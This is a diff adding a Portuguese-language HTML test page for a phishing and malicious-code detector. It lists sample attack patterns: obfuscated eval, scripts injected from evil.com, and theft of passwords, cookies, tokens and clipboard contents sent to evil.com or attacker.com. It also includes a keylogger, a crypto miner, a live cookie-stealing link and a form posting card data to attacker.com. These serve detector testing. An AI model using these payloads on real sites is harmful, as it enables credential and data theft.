@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test - Malicious Code Detection</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d32f2f;
+            border-bottom: 3px solid #d32f2f;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #1976d2;
+            margin-top: 30px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .code-section {
+            background: #f8f9fa;
+            border-left: 4px solid #007bff;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+        }
+        .severity {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .critical { background: #d32f2f; color: white; }
+        .high { background: #f57c00; color: white; }
+        .medium { background: #fbc02d; color: black; }
+        .low { background: #9e9e9e; color: white; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 Teste</h1> de Análise de Código Malicioso</h1>
+
+        <div class="warning">
+            <strong>⚠️ ATENÇÃO:</strong> Esta página contém exemplos de código potencialmente malicioso para fins de teste.
+            Os scripts estão comentados ou desabilitados para evitar execução real.
+        </div>
+
+        <h2>1. Eval e Execução Dinâmica <span class="severity critical">CRÍTICO</span></h2>
+        <div class="code-section">
+            <!-- Example: eval usage -->
+            <script type="text/plain">
+                // This would execute arbitrary code
+                var maliciousCode = "alert('Hacked!')";
+                eval(maliciousCode);
+
+                // Function constructor (similar to eval)
+                var func = new Function('return 2 + 2');
+                func();
+            </script>
+        </div>
+
+        <h2>2. Ofuscação Base64 <span class="severity high">ALTO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Obfuscated code using Base64
+                var encoded = "ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbSI=";
+                eval(atob(encoded));
+
+                // Multiple layers of encoding
+                var doubleEncoded = "WkdsamRXMWxiblF1Ykc5allYUnBiMjQ5SW1oMGRIQTZMeTlsZG1sc0xtTnZiU0k9";
+            </script>
+        </div>
+
+        <h2>3. Ofuscação com String.fromCharCode <span class="severity high">ALTO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Character code obfuscation
+                var cmd = String.fromCharCode(97,108,101,114,116,40,39,72,97,99,107,101,100,39,41);
+                eval(cmd);
+
+                // Hex encoding
+                var hexCode = "\x61\x6c\x65\x72\x74\x28\x27\x74\x65\x73\x74\x27\x29";
+            </script>
+        </div>
+
+        <h2>4. JSFuck - Ofuscação Extrema <span class="severity critical">CRÍTICO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // JSFuck example (only uses []()!+ characters)
+                [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]
+            </script>
+        </div>
+
+        <h2>5. Injeção de Scripts Dinâmicos <span class="severity high">ALTO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Dynamic script injection
+                var script = document.createElement('script');
+                script.src = 'http://evil.com/malware.js';
+                document.body.appendChild(script);
+
+                // iframe injection
+                var iframe = document.createElement('iframe');
+                iframe.src = 'http://phishing-site.com';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+            </script>
+        </div>
+
+        <h2>6. Captura de Credenciais <span class="severity critical">CRÍTICO</span></h2>
+        <div class="code-section">
+            <form id="fake-login">
+                <input type="email" id="email" placeholder="Email">
+                <input type="password" id="password" placeholder="Senha">
+                <button type="submit">Entrar</button>
+            </form>
+
+            <script type="text/plain">
+                // Credential harvesting
+                document.getElementById('password').addEventListener('input', function(e) {
+                    var stolenPassword = e.target.value;
+                    // Send to attacker's server
+                    fetch('http://evil.com/steal', {
+                        method: 'POST',
+                        body: JSON.stringify({password: stolenPassword})
+                    });
+                });
+
+                // Keylogger
+                document.addEventListener('keypress', function(e) {
+                    var key = e.key;
+                    console.log('Key pressed: ' + key);
+                });
+            </script>
+        </div>
+
+        <h2>7. Exfiltração de Dados <span class="severity high">ALTO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Cookie stealing
+                var cookies = document.cookie;
+                fetch('http://attacker.com/log', {
+                    method: 'POST',
+                    body: cookies
+                });
+
+                // LocalStorage access
+                var token = localStorage.getItem('authToken');
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'http://evil.com/steal', true);
+                xhr.send(token);
+
+                // WebSocket for real-time data exfiltration
+                var ws = new WebSocket('ws://attacker.com/socket');
+                ws.onopen = function() {
+                    ws.send(document.cookie);
+                };
+            </script>
+        </div>
+
+        <h2>8. setTimeout/setInterval com Strings <span class="severity high">ALTO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Dangerous setTimeout usage
+                setTimeout("alert('XSS')", 1000);
+                setInterval("console.log('malicious')", 5000);
+            </script>
+        </div>
+
+        <h2>9. document.write e innerHTML <span class="severity medium">MÉDIO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // document.write (can inject malicious content)
+                document.write('<script src="http://evil.com/malware.js"></scr' + 'ipt>');
+
+                // innerHTML manipulation
+                document.body.innerHTML = '<img src=x onerror="alert(\'XSS\')">';
+            </script>
+        </div>
+
+        <h2>10. Redirecionamento Oculto <span class="severity medium">MÉDIO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Hidden redirect
+                window.location = 'http://phishing-site.com';
+                location.href = 'http://malicious.com';
+                location.replace('http://scam.com');
+            </script>
+        </div>
+
+        <h2>11. Minerador de Criptomoedas <span class="severity critical">CRÍTICO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Crypto mining (Coinhive example)
+                var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
+                miner.start();
+
+                // Alternative cryptonight miners
+                var cryptonight = new Cryptonight();
+                cryptonight.start();
+            </script>
+        </div>
+
+        <h2>12. Acesso a Recursos Sensíveis <span class="severity high">ALTO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Webcam/microphone access
+                navigator.mediaDevices.getUserMedia({video: true, audio: true})
+                    .then(function(stream) {
+                        // Send stream to attacker
+                    });
+
+                // Clipboard access
+                navigator.clipboard.readText().then(function(text) {
+                    fetch('http://evil.com/clipboard', {
+                        method: 'POST',
+                        body: text
+                    });
+                });
+
+                // Geolocation
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    var coords = pos.coords.latitude + ',' + pos.coords.longitude;
+                    // Send to attacker
+                });
+            </script>
+        </div>
+
+        <h2>13. Unicode e Escapes <span class="severity medium">MÉDIO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Unicode escapes
+                var cmd = "\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029";
+                eval(cmd);
+
+                // Octal escapes
+                var oct = "\141\154\145\162\164\050\047\170\163\163\047\051";
+            </script>
+        </div>
+
+        <h2>14. Formulário com Ação Externa <span class="severity medium">MÉDIO</span></h2>
+        <div class="code-section">
+            <form action="http://attacker.com/steal-data" method="POST">
+                <input type="text" name="username" placeholder="Usuário">
+                <input type="password" name="password" placeholder="Senha">
+                <input type="text" name="cpf" placeholder="CPF">
+                <input type="text" name="card" placeholder="Cartão de Crédito">
+                <button type="submit">Enviar</button>
+            </form>
+        </div>
+
+        <h2>15. Variáveis Ofuscadas <span class="severity low">BAIXO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Obfuscated variable names
+                var _=function(){};
+                var __=function(){};
+                var $=document;
+                var $$=window;
+                var $_$=function(){};
+                var _$_=function(){};
+            </script>
+        </div>
+
+        <h2>16. Alta Entropia (String Base64 Longa) <span class="severity medium">MÉDIO</span></h2>
+        <div class="code-section">
+            <script type="text/plain">
+                // Long Base64 string (high entropy)
+                var payload = "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB2ZXJ5IGxvbmcgc3RyaW5nIHRoYXQgd291bGQgY29udGFpbiBvYmZ1c2NhdGVkIGNvZGUgb3IgbWFsaWNpb3VzIHBheWxvYWQuIEl0IGtlZXBzIGdvaW5nIGFuZCBnb2luZyB0byB0cmlnZ2VyIHRoZSBsb25nIEJhc2U2NCBkZXRlY3Rpb24uIEhlcmUgYXJlIG1vcmUgY2hhcmFjdGVycyB0byBtYWtlIGl0IGV2ZW4gbG9uZ2VyIGFuZCBtb3JlIHN1c3BpY2lvdXMuIEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5";
+            </script>
+        </div>
+
+        <div class="warning" style="margin-top: 40px;">
+            <strong>ℹ️ Como testar:</strong>
+            <ol>
+                <li>Copie a URL desta página</li>
+                <li>Cole na extensão PyPhish Sentinel ou na interface web</li>
+                <li>Observe os resultados da análise de código-fonte</li>
+                <li>Verifique se os padrões maliciosos e técnicas de ofuscação foram detectados</li>
+            </ol>
+        </div>
+
+        <!-- Hidden malicious event handlers -->
+        <div onclick="eval('alert(1)')" style="display:none;">Hidden div with eval</div>
+        <img src="invalid.jpg" onerror="console.log('XSS attempt')" style="display:none;">
+        <a href="javascript:void(fetch('http://evil.com/steal?data='+document.cookie))">Click me</a>
+    </div>
+
+    <!-- Actual working script to demonstrate detection (safe) -->
+    <script>
+        // This is a safe script that just logs to console
+        console.log('Test page loaded - all malicious scripts are disabled');
+
+        // Demonstrate FormData usage (safe context)
+        document.getElementById('fake-login')?.addEventListener('submit', function(e) {
+            e.preventDefault();
+            console.log('Form submission prevented - this is a test page');
+        });
+    </script>
+</body>
+</html>
